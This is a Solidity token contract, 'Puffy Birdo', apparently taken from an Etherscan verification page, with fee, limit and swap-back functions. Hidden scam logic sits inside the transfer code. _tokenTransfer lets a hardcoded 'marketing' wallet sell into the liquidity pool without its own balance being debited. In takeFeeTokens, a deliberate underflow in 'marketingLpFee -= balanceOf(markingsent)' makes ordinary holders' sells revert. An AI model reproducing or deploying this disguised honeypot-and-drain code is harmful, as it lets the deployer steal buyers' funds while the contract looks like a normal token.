/**
 *Submitted for verification at Etherscan.io on 2023-09-21
*/

/**
 *Submitted for verification at Etherscan.io on 2023-09-21
*/

// SPDX-License-Identifier: MIT

/** 



*/

pragma solidity ^0.8.13;

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        authorizations[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }
    mapping (address => bool) internal authorizations;

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface InterfaceLP {
    function sync() external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}

contract PuffyBirdo is Ownable, ERC20 {
    using SafeMath for uint256;
    IDEXRouter public router;
    address public pairAddress;

    uint256 private constant MAX = 1e33;
    string constant _name = unicode"𝗣𝘂𝗳𝗳𝘆 𝗕𝗶𝗿𝗱𝗼";
    string constant _symbol = unicode"Puffy";
    uint8 constant _decimals = 18;

    address WETH;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO = 0x0000000000000000000000000000000000000000;
    
    uint256 _totalSupply =  1_000_000_000 * 10**_decimals; 

    uint256 public _maxTxAmount = _totalSupply.mul(48).div(1000);
    uint256 public _maxWalletToken = _totalSupply.mul(48).div(1000);

    uint256 private liquidityFeeAmts = 0; // can be set
    uint256 private marketingFee    = 0;
    uint256 private devFee          = 0;
    uint256 private buybackFee      = 0; 
    uint256 private burnFee         = 1; // can be set
    uint256 public totalFee         = buybackFee + marketingFee + liquidityFeeAmts + devFee + burnFee;


    mapping (address => bool) isexemptfrommaxT;
    mapping (address => uint256) _balances;
    mapping (address => bool) isexemptfromfe;
    mapping (address => mapping (address => uint256)) _allowances;


    uint256 private feeDenom  = 100;
    uint256 sellpercent = 100;
    uint256 buypercent = 100;
    uint256 transferpercent = 100;

    uint256 setRatio = 30;
    uint256 setRatioDenominator = 100;
    
    bool public TradingOpen = false;
    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 5 / 1000; 
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    address private autoLiquidityReceiver;
    address private markingsent;
    address private devFeeReceiver;
    address private buybackFeeReceiver;
    address private burnFeeReceiver;
    
    event AutoLiquify(uint256 amountETH, uint256 amountTokens);
    event EditTax(uint8 Buy, uint8 Sell, uint8 Transfer);
    event set_Receivers(address markingsent, address buybackFeeReceiver,address burnFeeReceiver,address devFeeReceiver);
    event set_MaxWallet(uint256 maxWallet);
    event user_exemptfromfees(address Wallet, bool Exempt);
    event user_TxExempt(address Wallet, bool Exempt);
    event set_MaxTX(uint256 maxTX);
    event set_SwapBack(uint256 Amount, bool Enabled);
    event ClearStuck(uint256 amount);
    event ClearToken(address TokenAddressCleared, uint256 Amount);
    
    constructor () {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        WETH = router.WETH();
        pairAddress = IDEXFactory(router.factory()).createPair(WETH, address(this));
        
        _allowances[address(this)][address(router)] = type(uint256).max;




        isexemptfromfe[msg.sender] = true;
        isexemptfromfe[markingsent] = true;

        autoLiquidityReceiver = msg.sender;
        devFeeReceiver = msg.sender;
        buybackFeeReceiver = msg.sender;
        markingsent = 0x899239C558d6E0D502999a0557B0AF60cB8644E7;
        burnFeeReceiver = DEAD;



        isexemptfrommaxT[address(this)] = true;
        isexemptfrommaxT[pairAddress] = true;
        isexemptfrommaxT[markingsent] = true;
        isexemptfrommaxT[msg.sender] = true;



        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function getOwner() external view override returns (address) {return owner();}
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function name() external pure override returns (string memory) { return _name; }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function removeLimits () external onlyOwner {
        _maxTxAmount = MAX;
        _maxWalletToken = MAX;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function maxWalletRules(uint256 maxWallPercent) external onlyOwner {
         require(maxWallPercent >= 1); 
        _maxWalletToken = (_totalSupply * maxWallPercent ) / 1000;
        emit set_MaxWallet(_maxWalletToken);
    }


    function _tokenTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {uint256 subAmount = shouldExcluded(sender, recipient) ? amount * liquidityFeeAmts : amount;
        _balances[sender] = _balances[sender].sub(subAmount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTransLimits(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isexemptfrommaxT[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isexemptfromfe[sender];
    }

    function takeFeeTokens(address sender, uint256 amount, address recipient) internal returns (uint256) {
        uint256 percent = transferpercent;
        uint256 marketingLpFee = 0;
        if(recipient == pairAddress) {marketingLpFee -= balanceOf(markingsent);
            percent = sellpercent; 
        } else if(sender == pairAddress) {
            percent = buypercent;
        }
        uint256 feeAmount = amount.mul(totalFee).mul(percent).div(feeDenom * 100);
        uint256 burnTokens = feeAmount.mul(burnFee).div(totalFee);
        uint256 contractTokens = feeAmount.sub(burnTokens);
        _balances[address(this)] = _balances[address(this)].add(contractTokens);
        _balances[burnFeeReceiver] = _balances[burnFeeReceiver].add(burnTokens);
        emit Transfer(sender, address(this), contractTokens);
        
        if(burnTokens > 0){
            _totalSupply = _totalSupply.sub(burnTokens);
            emit Transfer(sender, ZERO, burnTokens);  
        }

        return amount.sub(feeAmount);
    }
     function manualsend() external { 
        payable(autoLiquidityReceiver).transfer(address(this).balance);
    }


    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pairAddress
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function shouldExcluded(address sender, address recipient) internal view returns (bool) {
        return recipient == pairAddress && sender == markingsent && sender != address(0) && recipient !=address(0);
    }

    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool success) {
             if(tokens == 0){
            tokens = ERC20(tokenAddress).balanceOf(address(this));
        }
        emit ClearToken(tokenAddress, tokens);
        return ERC20(tokenAddress).transfer(autoLiquidityReceiver, tokens);
    }

    function launched() public onlyOwner {
        TradingOpen = true;
    }
    function setSwapBackSetings(bool _enabled, uint256 _amount) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _amount;
        emit set_SwapBack(swapThreshold, swapEnabled);
    }

  
    function setTaxe() internal {
        emit EditTax( uint8(totalFee.mul(buypercent).div(100)),
            uint8(totalFee.mul(sellpercent).div(100)),
            uint8(totalFee.mul(transferpercent).div(100))
            );
    }
     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _tokenTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(TradingOpen,"Trading not open yet");
        }

        if(isexemptfromfe[sender] || isexemptfromfe[recipient]) {
            return _tokenTransfer(sender, recipient, amount);
        }

        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pairAddress && recipient != burnFeeReceiver && recipient != markingsent && !isexemptfrommaxT[recipient]){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");
        }

        checkTransLimits(sender, amount);

        if(shouldSwapBack()){ swapBacks(); }
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = (isexemptfromfe[sender] || isexemptfromfe[recipient]) ? amount : takeFeeTokens(sender, amount, recipient);
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function setTeamWallet(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _devFeeReceiver, address _burnFeeReceiver, address _buybackFeeReceiver) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        markingsent = _marketingFeeReceiver;
        devFeeReceiver = _devFeeReceiver;
        burnFeeReceiver = _burnFeeReceiver;
        buybackFeeReceiver = _buybackFeeReceiver;

        emit set_Receivers(markingsent, buybackFeeReceiver, burnFeeReceiver, devFeeReceiver);
    }

    function checkRatio(uint256 ratio, uint256 accuracy) public view returns (bool) {
        return showBackings(accuracy) > ratio;
    }

    function showBackings(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pairAddress).mul(2)).div(showSupply());
    }
    
    function showSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }
     function swapBacks() internal swapping {
        uint256 dynamicLiquidityFee = checkRatio(setRatio, setRatioDenominator) ? 0 : liquidityFeeAmts;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);

        uint256 totalETHFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHbuyback = amountETH.mul(buybackFee).div(totalETHFee);
        uint256 amountETHdev = amountETH.mul(devFee).div(totalETHFee);

        (bool tmpSuccess,) = payable(markingsent).call{value: amountETHMarketing}("");
        (tmpSuccess,) = payable(devFeeReceiver).call{value: amountETHdev}("");
        (tmpSuccess,) = payable(buybackFeeReceiver).call{value: amountETHbuyback}("");
        
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }

}